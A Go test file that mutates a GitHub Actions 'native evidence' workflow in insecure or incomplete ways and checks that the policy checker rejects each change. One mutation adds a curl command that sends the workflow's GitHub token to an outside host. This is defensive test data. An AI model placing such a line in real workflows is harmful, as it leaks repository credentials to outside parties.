package main

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"gopkg.in/yaml.v3"
)

func TestCheckWorkflowAcceptsAuditedNativeEvidenceEntry(t *testing.T) {
	t.Parallel()

	body, err := os.ReadFile(filepath.Join(findRepositoryRoot(t), ".github", "workflows", "native-evidence.yml"))
	if err != nil {
		t.Fatalf("read native evidence workflow: %v", err)
	}
	if err := checkWorkflow(body); err != nil {
		t.Fatalf("native evidence policy rejected an audited non-release fixture: %v", err)
	}
}

func TestRequireOnlyMappingKeysPreservesAuditedKeyError(t *testing.T) {
	t.Parallel()

	err := requireOnlyMappingKeys(mappingNode("unexpected", scalarNode("value")), "audited")
	if err == nil || err.Error() != "must contain exactly the audited keys" {
		t.Fatalf("requireOnlyMappingKeys() error = %v, want exact audited-key error", err)
	}
}

func TestCheckWorkflowRejectsNativeEvidenceSecurityAndCompletenessMutations(t *testing.T) {
	for _, test := range []struct {
		name   string
		mutate func(t *testing.T, root *yaml.Node)
	}{
		{
			name: "tag trigger",
			mutate: func(t *testing.T, root *yaml.Node) {
				push := requireMappingValue(t, requireMappingValue(t, root, "on"), "push")
				appendMappingValue(t, push, "tags", sequenceNode("v*"))
			},
		},
		{
			name: "secret reference",
			mutate: func(t *testing.T, root *yaml.Node) {
				appendMappingValue(t, requireJob(t, root), "env", mappingNode("UNSAFE", scalarNode("${{ secrets.RELEASE_SIGNING_PRIVATE_KEY }}")))
			},
		},
		{
			name: "release environment",
			mutate: func(t *testing.T, root *yaml.Node) {
				appendMappingValue(t, requireJob(t, root), "environment", scalarNode("release"))
			},
		},
		{
			name: "permission expansion",
			mutate: func(t *testing.T, root *yaml.Node) {
				requireMappingValue(t, requireJob(t, root), "permissions").Content[1].Value = "write"
			},
		},
		{
			name: "mutable action",
			mutate: func(t *testing.T, root *yaml.Node) {
				requireMappingValue(t, requireJobSteps(t, root).Content[0], "uses").Value = "actions/checkout@v4"
			},
		},
		{
			name: "release command",
			mutate: func(t *testing.T, root *yaml.Node) {
				requireJobSteps(t, root).Content = append(requireJobSteps(t, root).Content, mappingNode("name", scalarNode("Publish"), "shell", scalarNode("bash"), "run", scalarNode("gh release create v0.1.0")))
			},
		},
		{
			name: "github token curl injection",
			mutate: func(t *testing.T, root *yaml.Node) {
				run := requireMappingValue(t, requireJobSteps(t, root).Content[8], "run")
				run.Value += "curl -H 'Authorization: Bearer ${{ github.token }}' https://example.invalid\n"
			},
		},
		{
			name: "unrestricted dispatch ref",
			mutate: func(t *testing.T, root *yaml.Node) {
				requireMappingValue(t, requireJobSteps(t, root).Content[3], "run").Value = "true"
			},
		},
		{
			name: "missing native smoke",
			mutate: func(t *testing.T, root *yaml.Node) {
				removeStepNamed(t, requireJobSteps(t, root), "Run native GIF/APNG smoke")
			},
		},
		{
			name: "windows smoke does not select lld backed clang",
			mutate: func(t *testing.T, root *yaml.Node) {
				run := requireMappingValue(t, requireJobSteps(t, root).Content[7], "run")
				run.Value = strings.ReplaceAll(run.Value, "  export CC='clang -fuse-ld=lld'\n", "")
			},
		},
		{
			name: "windows binary build does not select lld backed clang",
			mutate: func(t *testing.T, root *yaml.Node) {
				run := requireMappingValue(t, requireJobSteps(t, root).Content[8], "run")
				run.Value = strings.ReplaceAll(run.Value, "  export CC='clang -fuse-ld=lld'\n", "")
			},
		},
		{
			name: "missing evidence upload",
			mutate: func(t *testing.T, root *yaml.Node) {
				removeStepNamed(t, requireJobSteps(t, root), "Upload native evidence")
			},
		},
		{
			name: "missing windows arm target",
			mutate: func(t *testing.T, root *yaml.Node) {
				include := requireMappingValue(t, requireMappingValue(t, requireJob(t, root), "strategy"), "matrix")
				include = requireMappingValue(t, include, "include")
				include.Content = include.Content[:len(include.Content)-1]
			},
		},
	} {
		t.Run(test.name, func(t *testing.T) {
			root := checkedInWorkflowRoot(t)
			test.mutate(t, root)
			body, err := yaml.Marshal(root)
			if err != nil {
				t.Fatalf("marshal mutated workflow: %v", err)
			}
			if err := checkWorkflow(body); err == nil {
				t.Fatal("native evidence policy accepted a security or completeness mutation")
			}
		})
	}
}
